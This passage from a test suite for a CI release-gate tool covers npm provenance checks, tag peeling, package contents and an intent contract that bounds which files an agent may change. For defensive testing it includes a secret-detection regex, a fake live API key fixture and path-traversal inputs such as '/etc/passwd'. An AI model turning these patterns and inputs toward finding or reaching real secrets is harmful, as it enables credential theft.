    assert.equal(waited.attempts, 2);
    assert.equal(calls, 2);

    const exhausted = waitForNpmGitHead(
      { name: "getadvantage", version: "0.9.0", candidateHeadSha: releaseSha, attempts: 2, delayMs: 0 },
      { npmView: () => docsSha, sleep: () => {} },
    );
    assert.equal(exhausted.ok, false);
    assert.equal(exhausted.reason, "npm-gitHead-mismatch");
  }

  // --- 6. Behavioral: annotated exact tag peels to commit; lightweight v1 peels ---
  {
    const base = freshBase();
    try {
      const repo = path.join(base, "peel-tags");
      initRepo(repo);
      write(repo, "package.json", '{"name":"peel","version":"0.9.0"}\n');
      write(repo, "README.md", "# peel\n");
      commitAll(repo, "release: 0.9.0");
      const release = g(["rev-parse", "HEAD"], repo);

      // Annotated exact tag (what apply creates with `git tag -a`).
      g(["tag", "-a", "v0.9.0", "-m", "release: getadvantage 0.9.0", release], repo);
      // Lightweight floating major (Action convention).
      g(["tag", "v1", release], repo);

      // Tag object id for annotated tags differs from the commit.
      const tagObject = g(["rev-parse", "refs/tags/v0.9.0"], repo);
      const tagPeeled = g(["rev-parse", "refs/tags/v0.9.0^{}"], repo);
      assert.equal(tagPeeled, release);
      assert.notEqual(tagObject, release, "annotated tag object must differ from commit");

      // Production helper must peel (^{}), never compare tag object to commit.
      const peeledExact = peelTagToCommit("v0.9.0", {
        revParse: (ref) => {
          try {
            return g(["rev-parse", "--verify", ref], repo);
          } catch {
            return null;
          }
        },
      });
      assert.equal(peeledExact, release.toLowerCase());

      const peeledV1 = peelTagToCommit("v1", {
        revParse: (ref) => {
          try {
            return g(["rev-parse", "--verify", ref], repo);
          } catch {
            return null;
          }
        },
      });
      assert.equal(peeledV1, release.toLowerCase());

      // Race/idempotence recheck shape: plan with peeled SHAs is keep/keep when correct.
      const idemp = planActionRelease({
        version: "0.9.0",
        headSha: release,
        existingTags: [
          { name: exactTagName("0.9.0"), sha: peeledExact },
          { name: ACTION_MAJOR_TAG, sha: peeledV1 },
        ],
        releaseExists: true,
      });
      assert.equal(idemp.ok, true);
      assert.equal(idemp.idempotent, true);

      // If someone mistakenly fed the annotated tag *object* id as head, mismatch.
      // (Demonstrates why apply must peel before compare.)
      const bad = planActionRelease({
        version: "0.9.0",
        headSha: release,
        existingTags: [{ name: "v0.9.0", sha: tagObject }],
        releaseExists: false,
      });
      assert.equal(bad.ok, false, "tag object id must not compare equal to commit without peel");
      assert.equal(bad.reason, "source-tag-mismatch");

      // Docs commit after release: gate using peeled tags + npm gitHead is no-op.
      write(repo, "docs/note.md", "docs only\n");
      commitAll(repo, "docs: post-release note");
      const docsHead = g(["rev-parse", "HEAD"], repo);
      assert.notEqual(docsHead, release);
      const docsGate = planPublishGate({
        localVersion: "0.9.0",
        publishedVersion: "0.9.0",
        candidateHeadSha: docsHead,
        npmGitHead: release,
        exactTagCommitSha: peelTagToCommit("v0.9.0", {
          revParse: (ref) => g(["rev-parse", "--verify", ref], repo),
        }),
        majorTagCommitSha: peelTagToCommit("v1", {
          revParse: (ref) => g(["rev-parse", "--verify", ref], repo),
        }),
        releaseExists: true,
      });
      assert.equal(docsGate.ok, true);
      assert.equal(docsGate.idempotentNoOp, true);
      assert.ok(shasEqual(docsGate.sourceSha, release));
      assert.ok(!shasEqual(docsGate.sourceSha, docsHead));
    } finally {
      cleanup(base);
    }
  }

  // --- 7. publish.yml: real uses: ./ gate before npm publish; gitHead verify before apply ---
  {
    const ymlPath = path.join(__dirname, "..", ".github", "workflows", "publish.yml");
    const yml = readFileSync(ymlPath, "utf8");
    const contract = validatePublishWorkflowContract(yml);
    assert.equal(contract.ok, true, contract.failures.join("; "));

    // Structural order: uses: ./ → npm publish → verify-npm-source → --apply
    const usesIdx = yml.search(/^\s*uses:\s*\.\/\s*$/m);
    const pubIdx = yml.search(/^\s*npm publish\b/m);
    const verifyIdx = yml.search(/--verify-npm-source/);
    const applyIdx = yml.search(/action-release\.mjs\s+--apply/);
    assert.ok(usesIdx >= 0, "must have uses: ./");
    assert.ok(pubIdx > usesIdx, "uses: ./ must precede npm publish");
    assert.ok(verifyIdx > pubIdx, "verify-npm-source must run after npm publish");
    assert.ok(applyIdx > verifyIdx, "tag apply must run after gitHead verification");
    assert.ok(/comment:\s*false/.test(yml));
    assert.ok(/report:\s*false/.test(yml));
    assert.ok(/working-directory:\s*fixtures\/publish-self-gate/.test(yml), "self-gate targets clean fixture");
    assert.ok(/Materialize clean publish self-gate fixture/.test(yml), "must materialize fixture before uses: ./");
    const matIdx = yml.search(/Materialize clean publish self-gate fixture/);
    assert.ok(matIdx >= 0 && matIdx < usesIdx, "fixture materialize must precede uses: ./");
    assert.ok(/gitHead/i.test(yml));
    assert.ok(/\^\{\}/.test(yml), "workflow must peel tags with ^{}");
    assert.ok(/source_sha/.test(yml), "workflow must pass proven source_sha to apply");
    const identityIdx = yml.search(/git config user\.name[\s\S]*git config user\.email/);
    assert.ok(identityIdx >= 0, "workflow must configure a repository-local tagger identity");
    assert.ok(identityIdx < applyIdx, "tagger identity must be configured before annotated-tag apply");
    assert.ok(!/git config --global user\.(?:name|email)/.test(yml), "workflow must not mutate global git identity");
    // Gate step must not use blind HEAD for already-published identity.
    assert.ok(/action-release\.mjs\s+--gate/.test(yml));
  }

  // --- 8. Prefix SHA equality (npm sometimes shortens) ---
  {
    assert.equal(normalizeSha("ABCDEF0"), "abcdef0");
    assert.equal(shasEqual(releaseSha, releaseSha.slice(0, 12)), true);
    assert.equal(shasEqual(releaseSha, docsSha.slice(0, 12)), false);
  }
});

scenario("publish self-gate fixture: clean nested-git GO; product root still NO-GO; no secret-shaped fixture", () => {
  const pkgRoot = path.join(__dirname, "..");
  const fixture = path.join(pkgRoot, "fixtures", "publish-self-gate");
  const ymlPath = path.join(pkgRoot, ".github", "workflows", "publish.yml");
  const yml = readFileSync(ymlPath, "utf8");

  // Versioned fixture must exist and stay secret-free.
  assert.ok(existsSync(path.join(fixture, "package.json")), "fixture package.json required");
  assert.ok(existsSync(path.join(fixture, "src", "app.js")), "fixture src/app.js required");
  assert.ok(existsSync(path.join(fixture, "README.md")), "fixture README required");
  const secretShape =
    /sk_live_|sk_test_|gh[pousr]_|-----BEGIN (?:[A-Z0-9 ]+)?PRIVATE KEY-----|postgres(?:ql)?:\/\/[^\s:]+:[^\s@]+@/i;
  function walkTexts(dir, acc = []) {
    for (const name of readdirSync(dir, { withFileTypes: true })) {
      if (name.name === "node_modules" || name.name === ".git") continue;
      const abs = path.join(dir, name.name);
      if (name.isDirectory()) walkTexts(abs, acc);
      else acc.push(readFileSync(abs, "utf8"));
    }
    return acc;
  }
  for (const text of walkTexts(fixture)) {
    assert.ok(!secretShape.test(text), "publish self-gate fixture must not contain secret-shaped content");
  }

  // Workflow contract: clean fixture working-directory, never product-root default alone.
  assert.ok(/working-directory:\s*fixtures\/publish-self-gate/.test(yml));
  assert.ok(/Materialize clean publish self-gate fixture/.test(yml));
  assert.ok(/install-dependencies:\s*false/.test(yml), "fixture has no deps; install skipped");
  // Must not silence the scanner for product tests/ or allowlist test fixtures.
  assert.ok(!/secrets:\s*\{[^}]*tests\//.test(yml));
  assert.ok(!/ignore:[\s\S]*tests\/run\.mjs/.test(yml));

  // Materialize nested git the same way the workflow does, then expect GO.
  const nested = path.join(freshBase(), "publish-self-gate");
  try {
    mkdirSync(nested, { recursive: true });
    // Copy versioned fixture sources into an isolated nested repo (hermetic).
    for (const rel of ["package.json", "README.md", ".gitignore", path.join("src", "app.js")]) {
      const src = path.join(fixture, rel);
      const dest = path.join(nested, rel);
      mkdirSync(path.dirname(dest), { recursive: true });
      writeFileSync(dest, readFileSync(src));
    }
    initRepo(nested);
    commitAll(nested, "publish self-gate clean fixture");
    const go = spawnSync(process.execPath, [path.join(pkgRoot, "index.mjs"), "check", "--ci", "--json", "--no-overview", "--no-brief-check"], {
      cwd: nested,
      encoding: "utf8",
      env: buildEnv(),
      timeout: 120_000,
    });
    assert.equal(go.status, 0, `clean fixture must GO:\n${go.stdout}\n${go.stderr}`);
    const goDoc = JSON.parse((go.stdout || "").trim() || "{}");
    assert.equal(goDoc.verdict, "GO");

    // Committed-secret fixture still NO-GO; SARIF must not contain the full secret.
    const hostile = path.join(path.dirname(nested), "hostile-secret");
    mkdirSync(hostile, { recursive: true });
    writeFileSync(path.join(hostile, "package.json"), '{"name":"hostile","version":"1.0.0","private":true}\n');
    const secret = "sk_live_" + "z9y8x7w6v5u4t3s2r1q0p9o8n7";
    writeFileSync(path.join(hostile, "leak.js"), `export const k = "${secret}";\n`);
    initRepo(hostile);
    commitAll(hostile, "chore: committed secret");
    const sarifPath = path.join(hostile, "out.sarif");
    const noGo = spawnSync(
      process.execPath,
      [path.join(pkgRoot, "index.mjs"), "check", "--ci", "--json", "--no-overview", "--no-brief-check", "--sarif", "out.sarif"],
      { cwd: hostile, encoding: "utf8", env: buildEnv(), timeout: 120_000 },
    );
    assert.equal(noGo.status, 1, "committed secret must NO-GO");
    const noGoDoc = JSON.parse((noGo.stdout || "").trim() || "{}");
    assert.equal(noGoDoc.verdict, "NO-GO");
    assert.ok(existsSync(sarifPath), "SARIF written on secret NO-GO");
    const sarifRaw = readFileSync(sarifPath, "utf8");
    assert.ok(!sarifRaw.includes(secret), "SARIF must not contain full secret");
    // Fragment safety: long unique middle of the key must not appear either.
    assert.ok(!sarifRaw.includes(secret.slice(8, 24)), "SARIF must not contain secret fragment");
  } finally {
    cleanup(path.dirname(nested));
  }

  // Product source tree still honestly NO-GO for intentional hostiles in tests/run.mjs.
  // (Proves the remedy did not suppress the scanner on the real product tree.)
  const product = spawnSync(
    process.execPath,
    [path.join(pkgRoot, "index.mjs"), "check", "--ci", "--json", "--no-overview", "--no-brief-check"],
    { cwd: pkgRoot, encoding: "utf8", env: buildEnv(), timeout: 180_000 },
  );
  assert.equal(product.status, 1, "product tree must still NO-GO on intentional test fixture secrets");
  let productDoc = null;
  try {
    productDoc = JSON.parse((product.stdout || "").trim());
  } catch {
    const s = (product.stdout || "").indexOf("{");
    const e = (product.stdout || "").lastIndexOf("}");
    if (s >= 0 && e > s) productDoc = JSON.parse(product.stdout.slice(s, e + 1));
  }
  assert.ok(productDoc && productDoc.verdict === "NO-GO", "product verdict must be NO-GO");
  const secretCheck = (productDoc.checks || []).find((c) => /Secret scan/i.test(c.label));
  assert.ok(secretCheck && secretCheck.status === "fail", "product secret scan must still fail (tests/ hostiles)");
  assert.ok(
    /tests\/run\.mjs/i.test(JSON.stringify(secretCheck)),
    "product NO-GO must still cite tests/run.mjs hostiles",
  );
  const testsBlob = readFileSync(path.join(pkgRoot, "tests", "run.mjs"), "utf8");
  assert.ok(/sk_live_/.test(testsBlob), "tests/run.mjs still holds intentional hostile fixtures");
});

scenario("packed package: includes action.yml + action/ files; cold workflow + action path", () => {
  const base = freshBase();
  try {
    const pkgRoot = path.join(__dirname, "..");
    const packDir = path.join(base, "pack");
    mkdirSync(packDir, { recursive: true });
    execFileSync("npm", ["pack", pkgRoot, "--pack-destination", packDir], {
      cwd: packDir,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
      shell: process.platform === "win32",
    });
    const tgz = path.join(packDir, readdirPack(packDir));
    const listing = execFileSync("tar", ["-tzf", tgz], { encoding: "utf8" });
    const norm = listing.replace(/\\/g, "/");
    const must = [
      "package/action.yml",
      "package/action/main.mjs",
      "package/action/summary.mjs",
      "package/action/enforce.mjs",
      "package/action/install.mjs",
      "package/action.mjs",
      "package/sarif.mjs",
      "package/util.mjs",
      "package/checks.mjs",
      "package/index.mjs",
      "package/package.json",
    ];
    for (const m of must) {
      assert.ok(norm.includes(m), `tarball missing ${m}:\n${listing.slice(0, 800)}`);
    }
    // Cold install from packed tarball — required Action files present
    const cold = path.join(base, "cold");
    mkdirSync(cold, { recursive: true });
    execFileSync("npm", ["install", "--ignore-scripts", tgz], {
      cwd: cold,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
      shell: process.platform === "win32",
    });
    const installed = path.join(cold, "node_modules", "getadvantage");
    assert.ok(existsSync(path.join(installed, "action.yml")));
    assert.ok(existsSync(path.join(installed, "action", "main.mjs")));
    assert.ok(existsSync(path.join(installed, "action", "summary.mjs")));
    assert.ok(existsSync(path.join(installed, "action", "enforce.mjs")));
    assert.ok(existsSync(path.join(installed, "action", "install.mjs")));
    const pkg = JSON.parse(readFileSync(path.join(installed, "package.json"), "utf8"));
    const expectedVersion = JSON.parse(readFileSync(path.join(__dirname, "..", "package.json"), "utf8")).version;
    assert.equal(pkg.version, expectedVersion);

    // Packed cold path: scrub helpers + summary marker + action gate entry load
    const utilCold = readFileSync(path.join(installed, "util.mjs"), "utf8");
    assert.ok(/scrubCredentialEnv/.test(utilCold), "packed util must export credential scrub");
    assert.ok(/SARIF_RUN_NONCE/.test(utilCold), "scrub must cover SARIF attribution nonce");
    const mainCold = readFileSync(path.join(installed, "action", "main.mjs"), "utf8");
    assert.ok(/scrubCredentialEnv|buildCliChildEnv/.test(mainCold), "packed action must scrub child env");
    assert.ok(/validateSarifInputPath|isCurrentSarifWrite|fileSnapshot/.test(mainCold));
    assert.ok(/sha256|createHash|randomBytes|expectedNonce|sarifNonce/.test(mainCold), "packed action must use digest+nonce for SARIF");
    assert.ok(/pull_request_target/.test(mainCold) && /setErrorOutputs|return 1/.test(mainCold));
    const sumCold = readFileSync(path.join(installed, "action", "summary.mjs"), "utf8");
    assert.ok(/isBotOwnedMarkerComment|COMMENT_PAGE_CAP/.test(sumCold));
    assert.ok(/list-truncated|isVerifiedBotLogin|ACTIONS_BOT_LOGIN/.test(sumCold));
    const ymlCold = readFileSync(path.join(installed, "action.yml"), "utf8");
    assert.ok(/id:\s*sarif_upload/.test(ymlCold), "upload step id for outcome");
    assert.ok(/sarif-upload-eligible/.test(ymlCold), "eligibility gates upload (fork skip)");
    assert.ok(/action\/enforce\.mjs/.test(ymlCold), "enforce.mjs final required-check");
    assert.ok(/action\/install\.mjs/.test(ymlCold), "install.mjs credential-scrubbed boundary");
    assert.ok(/GETADVANTAGE_UPLOAD_OUTCOME|sarif_upload\.outcome/.test(ymlCold));
    assert.ok(/fork/i.test(ymlCold), "honest fork skip documented");
    const installCold = readFileSync(path.join(installed, "action", "install.mjs"), "utf8");
    assert.ok(/scrubCredentialEnv/.test(installCold));
    assert.ok(/--no-package-lock/.test(installCold), "non-mutating install without lockfile");
    assert.ok(/--ignore-scripts/.test(installCold));
    const enfCold = readFileSync(path.join(installed, "action", "enforce.mjs"), "utf8");
    assert.ok(/decideJobOutcome|sarif-upload-failed|sarif-upload-skipped-eligible/.test(enfCold));
    const sarifCold = readFileSync(path.join(installed, "sarif.mjs"), "utf8");
    assert.ok(/getadvantage\/runNonce/.test(sarifCold));

    // Cold: generate workflow in a fresh temp repo
    const sample = path.join(base, "sample");
    initRepo(sample);
    write(sample, "package.json", '{"name":"cold-action","version":"1.0.0"}\n');
    write(sample, "app.js", "console.log('ok');\n");
    commitAll(sample, "chore: cold");
    const bin = path.join(installed, "index.mjs");
    const r = spawnSync(process.execPath, [bin, "github-action"], {
      cwd: sample,
      encoding: "utf8",
      env: buildEnv(),
      timeout: 60_000,
    });
    assert.equal(r.status, 0, r.stderr + r.stdout);
    const wf = readFileSync(path.join(sample, ".github", "workflows", "getadvantage.yml"), "utf8");
    assert.ok(/BellmeJoe\/getadvantage-cli@v1/.test(wf));

    // YAML-ish parse checks (no third-party YAML lib — structural assertions)
    assert.ok(/^name:\s/m.test(wf));
    assert.ok(/^on:/m.test(wf));
    assert.ok(/^permissions:/m.test(wf));
    assert.ok(/^jobs:/m.test(wf));
    const actionYml = readFileSync(path.join(installed, "action.yml"), "utf8");
    assert.ok(/^name:\s/m.test(actionYml));
    assert.ok(/^runs:/m.test(actionYml));
    assert.ok(/using:\s*composite/.test(actionYml));
    assert.ok(/action\/main\.mjs/.test(actionYml));
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 46. Intent Contract (0.10.0) — local change-scope trust layer
// ---------------------------------------------------------------------------

/** Write + commit a trusted intent contract on HEAD. */
function commitIntent(repo, contract) {
  write(repo, ".getadvantage/intent.json", JSON.stringify(contract, null, 2) + "\n");
  commitAll(repo, "chore: intent contract");
}

const INTENT_BASE = {
  schemaVersion: 1,
  goal: "Add password reset",
  allow: ["src/auth/**", "tests/auth/**"],
  deny: [".github/**"],
};

scenario("intent: authorized source+test change → GO; stable hash; human/JSON agree", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    commitIntent(repo, INTENT_BASE);
    // Agent work inside allowlist
    write(repo, "src/auth/reset.js", "export function reset() { return true; }\n");
    write(repo, "tests/auth/reset.test.js", "import { reset } from '../../src/auth/reset.js';\n");
    // Unstaged + one staged
    g(["add", "src/auth/reset.js"], repo);

    const human = run(["intent", "check"], repo);
    assert.equal(human.code, 0, `expected GO\n${human.stderr}\n${human.stdout}`);
    assert.match(human.stdout + human.stderr, /\bGO\b/);
    assert.match(human.stdout + human.stderr, /scope verified; semantic correctness not proven/i);
    assert.doesNotMatch(human.stdout + human.stderr, /export function reset/);

    const j = run(["intent", "check", "--json"], repo);
    assert.equal(j.code, 0, `json GO\n${j.stderr}\n${j.stdout}`);
    const doc = parseJson(j);
    assert.equal(doc.verdict, "GO");
    assert.equal(doc.exitCode, 0);
    assert.ok(doc.intent, "receipt present");
    assert.equal(doc.intent.limitation, "scope verified; semantic correctness not proven");
    assert.match(doc.intent.contractHash, /^sha256:[0-9a-f]{64}$/);
    assert.ok(doc.intent.changedPaths.some((p) => /src\/auth\/reset\.js/.test(p)));
    assert.ok(doc.intent.changedPaths.some((p) => /tests\/auth/.test(p)));
    assert.equal((doc.intent.violations || []).length, 0);

    // Stable hash across two runs
    const j2 = run(["intent", "check", "--json"], repo);
    const doc2 = parseJson(j2);
    assert.equal(doc2.intent.contractHash, doc.intent.contractHash, "intent hash must be stable");

    // Main check includes intent when trusted contract present
    const gate = run(["check", "--json", "--no-overview", "--no-brief-check"], repo);
    // Dirty tree may NO-GO the overall gate; intent itself must still be present + pass
    const gdoc = parseJson(gate);
    const ic = (gdoc.checks || []).find((c) => /Intent Contract/i.test(c.label));
    assert.ok(ic, "main check must include Intent Contract when trusted contract on HEAD");
    assert.equal(ic.status, "pass", `intent should pass inside check\n${JSON.stringify(ic)}`);
    assert.ok(gdoc.intent || ic.intent, "intent receipt exposed on check JSON");
  } finally {
    cleanup(base);
  }
});

scenario("intent: outside allowlist → NO-GO; names path only; no content leak", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    commitIntent(repo, INTENT_BASE);
    const secretBody = "TOP_SECRET_PAYLOAD_should_never_print_xyzzy";
    write(repo, "src/other/leak.js", `export const x = "${secretBody}";\n`);

    const r = run(["intent", "check", "--json"], repo);
    assert.equal(r.code, 1, `expected NO-GO\n${r.stderr}\n${r.stdout}`);
    const doc = parseJson(r);
    assert.equal(doc.verdict, "NO-GO");
    assert.ok((doc.intent.violations || []).some((v) => v.reason === "outside-allow"));
    assert.ok(doc.intent.changedPaths.some((p) => p.replace(/\\/g, "/") === "src/other/leak.js"));
    const all = r.stdout + r.stderr;
    assert.ok(/src\/other\/leak\.js/.test(all), "must name violating path");
    assert.ok(!all.includes(secretBody), "must not leak file contents");
  } finally {
    cleanup(base);
  }
});

scenario("intent: deny wins even when allow also matches", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    commitIntent(repo, {
      schemaVersion: 1,
      goal: "Touch workflows under broad allow",
      allow: [".github/**", "src/**"],
      deny: [".github/**"],
    });
    write(repo, ".github/workflows/ci.yml", "name: ci\non: push\njobs: {}\n");
    const r = run(["intent", "check", "--json"], repo);
    assert.equal(r.code, 1);
    const doc = parseJson(r);
    assert.equal(doc.verdict, "NO-GO");
    assert.ok(
      (doc.intent.violations || []).some((v) => v.reason === "denied" && /ci\.yml/.test(v.path)),
      `expected deny violation: ${JSON.stringify(doc.intent.violations)}`,
    );
  } finally {
    cleanup(base);
  }
});

scenario("intent: missing required change and maxFiles → NO-GO", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    commitIntent(repo, {
      schemaVersion: 1,
      goal: "Must change auth tests; cap files",
      allow: ["src/**", "tests/**"],
      deny: [],
      require: ["tests/auth/**"],
      maxFiles: 1,
    });
    // Only src change — required tests missing, and if we add two files maxFiles fails
    write(repo, "src/a.js", "export const a = 1;\n");
    write(repo, "src/b.js", "export const b = 2;\n");
    const r = run(["intent", "check", "--json"], repo);
    assert.equal(r.code, 1);
    const doc = parseJson(r);
    const reasons = (doc.intent.violations || []).map((v) => v.reason);
    assert.ok(reasons.includes("required-missing"), `expected required-missing: ${reasons}`);
    assert.ok(reasons.includes("max-files"), `expected max-files: ${reasons}`);
  } finally {
    cleanup(base);
  }
});

scenario("intent: staged/unstaged/deleted/renamed/untracked cannot evade", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    // Seed files inside and outside future allow
    write(repo, "src/auth/old.js", "export const old = 1;\n");
    write(repo, "src/keep.js", "export const keep = 1;\n");
    write(repo, "lib/util.js", "export const u = 1;\n");
    commitAll(repo, "chore: seed paths");
    commitIntent(repo, {
      schemaVersion: 1,
      goal: "Auth only",
      allow: ["src/auth/**"],
      deny: [],
    });

    // Staged add inside allow
    write(repo, "src/auth/new.js", "export const n = 1;\n");
    g(["add", "src/auth/new.js"], repo);
    // Unstaged modify inside allow
    write(repo, "src/auth/old.js", "export const old = 2;\n");
    // Deleted outside allow (must NO-GO)
    g(["rm", "-q", "lib/util.js"], repo);
    // Rename outside → inside would need both paths authorized; rename from lib
    // Untracked outside
    write(repo, "docs/secret-plan.md", "plan\n");
    // Rename: move src/keep.js → src/auth/keep.js (old path outside allow)
    g(["mv", "src/keep.js", "src/auth/keep.js"], repo);

    const r = run(["intent", "check", "--json"], repo);
    assert.equal(r.code, 1, `expected NO-GO on evasion attempts\n${r.stderr}\n${r.stdout}`);
    const doc = parseJson(r);
    const paths = doc.intent.changedPaths.map((p) => p.replace(/\\/g, "/"));
    assert.ok(paths.some((p) => p === "lib/util.js"), `delete must count: ${paths}`);
    assert.ok(paths.some((p) => p === "docs/secret-plan.md"), `untracked must count: ${paths}`);
    assert.ok(paths.some((p) => p === "src/keep.js") || paths.some((p) => p === "src/auth/keep.js"), `rename paths: ${paths}`);
    // At least one outside-allow or the rename-from path
    assert.ok((doc.intent.violations || []).length > 0);
    assert.ok(
      (doc.intent.violations || []).some(
        (v) =>
          v.reason === "outside-allow" &&
          (v.path === "lib/util.js" || v.path === "docs/secret-plan.md" || v.path === "src/keep.js"),
      ),
      `expected outside-allow on evasion path: ${JSON.stringify(doc.intent.violations)}`,
    );
  } finally {
    cleanup(base);
  }
});

scenario("intent: editing worktree contract to broaden scope cannot authorize itself", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    commitIntent(repo, INTENT_BASE);
    // Agent broadens allow in worktree only
    const broadened = {
      ...INTENT_BASE,
      allow: ["src/**", "tests/**", "**/*"],
    };
    write(repo, ".getadvantage/intent.json", JSON.stringify(broadened, null, 2) + "\n");
    write(repo, "src/other/pwn.js", "export const pwn = true;\n");

    const r = run(["intent", "check", "--json"], repo);
    assert.equal(r.code, 1, `worktree broaden must not authorize\n${r.stderr}\n${r.stdout}`);
    const doc = parseJson(r);
    assert.equal(doc.verdict, "NO-GO");
    // Either outside-allow on src/other, or intent.json itself outside allow
    const violPaths = (doc.intent.violations || []).map((v) => v.path.replace(/\\/g, "/"));
    assert.ok(
      violPaths.some((p) => p === "src/other/pwn.js" || p === ".getadvantage/intent.json"),
      `expected violation naming pwn or intent.json: ${JSON.stringify(doc.intent.violations)}`,
    );
    assert.ok(doc.intent.worktreeContractDiffers, "receipt should note worktree differs");
  } finally {
    cleanup(base);
  }
});

scenario("intent: malformed schema, traversal, absolute paths, unsafe baseline fail closed", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);

    // Malformed JSON committed
    write(repo, ".getadvantage/intent.json", "{ not json\n");
    commitAll(repo, "chore: bad intent");
    let r = run(["intent", "check", "--json"], repo);
    assert.equal(r.code, 1);
    let doc = parseJson(r);
    assert.equal(doc.verdict, "NO-GO");
    assert.match((doc.check && doc.check.detail) || r.stdout + r.stderr, /JSON|valid|parse|schema|trust/i);

    // Reset to valid then bad schema fields
    write(
      repo,
      ".getadvantage/intent.json",
      JSON.stringify(
        {
          schemaVersion: 99,
          goal: "x",
          allow: ["src/**"],
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(repo, "chore: unsupported schema");
    r = run(["intent", "check", "--json"], repo);
    assert.equal(r.code, 1);

    // Absolute path in allow
    write(
      repo,
      ".getadvantage/intent.json",
      JSON.stringify(
        {
          schemaVersion: 1,
          goal: "abs",
          allow: ["/etc/passwd"],
          deny: [],
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(repo, "chore: absolute allow");
    r = run(["intent", "check"], repo);
    assert.equal(r.code, 1);
    assert.match(r.stdout + r.stderr, /unsafe|absolute|trust|NO-GO/i);

    // Traversal
    write(
      repo,
      ".getadvantage/intent.json",
      JSON.stringify(
        {
          schemaVersion: 1,
          goal: "trav",
          allow: ["../../secrets/**"],
          deny: [],
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(repo, "chore: traversal allow");
    r = run(["intent", "check"], repo);
    assert.equal(r.code, 1);

    // Windows-style absolute
    write(
      repo,
      ".getadvantage/intent.json",
      JSON.stringify(
        {
          schemaVersion: 1,
          goal: "winabs",
          allow: ["C:\\\\Windows\\\\System32"],
          deny: [],
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(repo, "chore: win absolute");
    r = run(["intent", "check"], repo);
    assert.equal(r.code, 1);

    // Remote-looking baseline via --base-ref
    write(
      repo,
      ".getadvantage/intent.json",
      JSON.stringify({ schemaVersion: 1, goal: "ok", allow: ["src/**"], deny: [] }, null, 2) + "\n",
    );
    commitAll(repo, "chore: good intent");
    r = run(["intent", "check", "--base-ref", "refs/pull/1/merge"], repo);
    assert.equal(r.code, 1, "remote/PR base-ref must fail closed");
    assert.match(r.stdout + r.stderr, /remote|PR|refuse|trust|NO-GO|baseline/i);

    // init rejects absolute --allow
    r = run(
      ["intent", "init", "--goal", "x", "--allow", "/abs/**"],
      repo,
    );
    assert.equal(r.code, 1);

    // Separator normalization: backslash allow is normalized; forward-slash change matches
    write(
      repo,
      ".getadvantage/intent.json",
      JSON.stringify(
        {
          schemaVersion: 1,
          goal: "sep",
          allow: ["src/auth/**"],
          deny: [],
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(repo, "chore: sep intent");
    write(repo, "src/auth/x.js", "export const x = 1;\n");
    r = run(["intent", "check", "--json"], repo);
    assert.equal(r.code, 0, `separator-normalized allow should GO\n${r.stderr}\n${r.stdout}`);
  } finally {
    cleanup(base);
  }
});

scenario("intent: no contract → main check omits intent (no false verified); intent check fails closed", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const gate = run(["check", "--json", "--no-overview", "--no-brief-check"], repo);
    assert.equal(gate.code, 0, `clean sample should GO\n${gate.stderr}`);
    const gdoc = parseJson(gate);
    const ic = (gdoc.checks || []).find((c) => /Intent Contract/i.test(c.label));
    assert.equal(ic, undefined, "no Intent Contract check without trusted contract");
    assert.equal(gdoc.intent, undefined, "no top-level intent receipt without contract");
    assert.doesNotMatch(JSON.stringify(gdoc), /intent verified/i);

    const bare = run(["intent", "check", "--json"], repo);
    assert.equal(bare.code, 1, "dedicated intent check without contract is non-zero");
  } finally {
    cleanup(base);
  }
});

scenario("intent: init CLI + packed cold install can init+check real temp git repo", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const init = run(
      [
        "intent",
        "init",
        "--goal",
        "Add password reset",
        "--allow",
        "src/auth/**",
        "--allow",
        "tests/auth/**",
        "--deny",
        ".github/**",
        "--max-files",
        "10",
        "--notes",
        "Human acceptance notes only — never executed",
      ],
      repo,
    );
    assert.equal(init.code, 0, `init failed\n${init.stderr}\n${init.stdout}`);
    assert.ok(existsSync(path.join(repo, ".getadvantage", "intent.json")));
    assert.match(init.stdout + init.stderr, /commit/i);
    commitAll(repo, "chore: intent contract from init");

    write(repo, "src/auth/ok.js", "export const ok = 1;\n");
    const chk = run(["intent", "check", "--json"], repo);
    assert.equal(chk.code, 0, `check after init\n${chk.stderr}\n${chk.stdout}`);
    const doc = parseJson(chk);
    assert.equal(doc.verdict, "GO");
    assert.match(doc.intent.contractHash, /^sha256:[0-9a-f]{64}$/);
    assert.ok(doc.intent.acceptanceNotes);

    // Packed cold path
    const packDir = path.join(base, "pack");
    mkdirSync(packDir, { recursive: true });
    const pkgRoot = path.join(__dirname, "..");
    execFileSync("npm", ["pack", pkgRoot, "--pack-destination", packDir], {
      cwd: packDir,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
      shell: process.platform === "win32",
    });
    const tgzName = readdirSync(packDir).find((f) => f.endsWith(".tgz"));
    assert.ok(tgzName, "tarball created");
    const listing = execFileSync("tar", ["-tzf", path.join(packDir, tgzName)], { encoding: "utf8" });
    assert.ok(listing.replace(/\\/g, "/").includes("package/intent.mjs"), `tarball must include intent.mjs:\n${listing.slice(0, 500)}`);

    const cold = path.join(base, "cold");
    mkdirSync(cold, { recursive: true });
    execFileSync("npm", ["install", "--ignore-scripts", path.join(packDir, tgzName)], {
      cwd: cold,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
      shell: process.platform === "win32",
    });
    const coldBin = path.join(cold, "node_modules", "getadvantage", "index.mjs");
    const coldRepo = path.join(base, "cold-repo");
    initRepo(coldRepo);
    write(coldRepo, "package.json", JSON.stringify({ name: "cold", version: "1.0.0", private: true }) + "\n");
    write(coldRepo, "app.js", "console.log(1)\n");
